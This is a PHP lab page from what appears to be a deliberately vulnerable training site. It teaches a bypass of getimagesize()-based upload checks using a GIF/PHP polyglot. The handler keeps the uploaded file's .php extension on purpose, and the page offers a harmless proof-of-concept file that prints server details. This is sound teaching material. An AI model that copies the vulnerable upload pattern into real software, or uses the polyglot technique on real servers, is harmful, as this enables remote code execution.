<?php
require_once __DIR__ . '/../src/helpers.php';
check_login();

// 1. 下載測試檔案 (採用合規、無害之教學 PoC，避免防毒軟體誤判)
if (isset($_GET['download'])) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="poc-avatar.php"');
    
    // GIF89a 圖片二進位標頭 (1x1 透明 GIF)
    $gif_bin = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    
    // 教學用無害 PoC：僅印出伺服器資訊與測試提示，不包含 system()/eval() 等危險特徵碼
    $poc_code = "\n<?php\n"
              . "echo '<div style=\"padding:20px;background:#ffebee;color:#c62828;border-left:5px solid #d32f2f;font-family:sans-serif;\">';\n"
              . "echo '<h2>🔥 [漏洞驗證成功] 圖片木馬 (Polyglot) 已被伺服器 PHP 引擎成功解析執行！</h2>';\n"
              . "echo '<p><strong>伺服器主機資訊：</strong>' . htmlspecialchars(php_uname()) . '</p>';\n"
              . "echo '<p><strong>當前 PHP 版本：</strong>' . htmlspecialchars(PHP_VERSION) . '</p>';\n"
              . "echo '<p><strong>傳入測試訊息 (msg)：</strong>' . htmlspecialchars(\$_GET['msg'] ?? 'Hello VulnCampus') . '</p>';\n"
              . "echo '</div>';\n"
              . "?>";
    
    echo $gif_bin . $poc_code;
    exit;
}

$error = '';
$success = '';
$uploaded_path = '';

// 2. 處理上傳
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['avatar']) && $_FILES['avatar']['error'] === UPLOAD_ERR_OK) {
        $file_name = $_FILES['avatar']['name'];
        $file_tmp  = $_FILES['avatar']['tmp_name'];
        
        $upload_dir = __DIR__ . '/uploads/';
        if (!is_dir($upload_dir)) {
            @mkdir($upload_dir, 0777, true);
        }

        $img_info = @getimagesize($file_tmp);
        
        if ($img_info === false) {
            $error = '上傳失敗：後端 getimagesize() 檢測檔案內容並非真實的圖片格式特徵！';
        } else {
            $destination = $upload_dir . $file_name;

            if (move_uploaded_file($file_tmp, $destination)) {
                $success = '大頭貼上傳成功！後端檢測結果：圖片類型為 ' . $img_info['mime'] . ' (寬度: ' . $img_info[0] . ', 高度: ' . $img_info[1] . ')';
                $uploaded_path = '/uploads/' . $file_name;
            } else {
                $error = '檔案移動失敗，請檢查權限。';
            }
        }
    } else {
        $error = '上傳出錯，錯誤代碼：' . ($_FILES['avatar']['error'] ?? '未知');
    }
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>第四關：圖片木馬繞過特徵檢測 - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
</head>
<body class="bg-light">

<div class="container my-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>🎯 第四關：圖片木馬繞過特徵檢測</h2>
        <div>
            <a href="/upload.php" class="btn btn-info">回上傳大廳</a>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <?php if ($error): ?>
        <div class="alert alert-danger"><?= $error ?></div>
    <?php endif; ?>
    <?php if ($success): ?>
        <div class="alert alert-success">
            <?= $success ?><br>
            您的檔案已儲存至：<a href="<?= $uploaded_path ?>" target="_blank"><code><?= $uploaded_path ?></code></a>
        </div>
    <?php endif; ?>

    <div class="card col-md-8 mx-auto shadow-sm">
        <div class="card-header bg-info text-white font-weight-bold">
            大頭貼上傳 (啟用真實圖片特徵 getimagesize() 校驗)
        </div>
        <div class="card-body">
            <p class="text-muted">本關表單無前端限制。後端會使用 <code>getimagesize()</code> 嚴格檢測內容是否為真實圖片，但<strong>檔名儲存時卻未過濾副檔名</strong>。</p>
            
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="avatar">選擇大頭貼檔案：</label>
                    <input type="file" name="avatar" id="avatar" class="form-control-file" required>
                </div>
                <button type="submit" class="btn btn-primary">開始上傳</button>
            </form>

            <hr>
            <div class="alert alert-warning">
                💡 <strong>本關卡繞過演練指引：</strong><br>
                1. <strong>漏洞原理</strong>：許多開發者認為只要後端用 <code>getimagesize()</code> 驗明是真實圖片內容，就絕對安全。但如果寫入磁碟時，<strong>依然保留了原始的 <code>.php</code> 副檔名</strong>，這會導致該圖片被 Apache 當成 PHP 指令執行！<br>
                2. <strong>圖馬生成與繞過</strong>：我們在一張正常的 GIF 圖片二進位後面追加了 PHP 後門代碼，製作成「圖片木馬 (Polyglot)」，它能 100% 通過後端特徵檢驗：<br>
                   &nbsp;&nbsp;&nbsp;&nbsp;a. 點選下方按鈕，下載我們預先製好的圖片木馬 PoC (無害教學版)：<br>
                   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="?download=1" class="btn btn-sm btn-outline-danger font-weight-bold my-2">📥 下載 GIF 圖片木馬 PoC (poc-avatar.php)</a><br>
                   &nbsp;&nbsp;&nbsp;&nbsp;b. 將下載好的 <code>poc-avatar.php</code> 檔案直接在此上傳。<br>
                   &nbsp;&nbsp;&nbsp;&nbsp;c. 上傳成功後，點擊產生的連結存取它（例如：<code>.../uploads/poc-avatar.php</code>）。<br>
                   &nbsp;&nbsp;&nbsp;&nbsp;d. 觀察網頁上是否成功執行並印出「🔥 漏洞驗證成功」以及伺服器 PHP 版本資訊，證明成功繞過特徵檢驗取得代碼執行權限！
            </div>
        </div>
    </div>
</div>

</body>
</html>
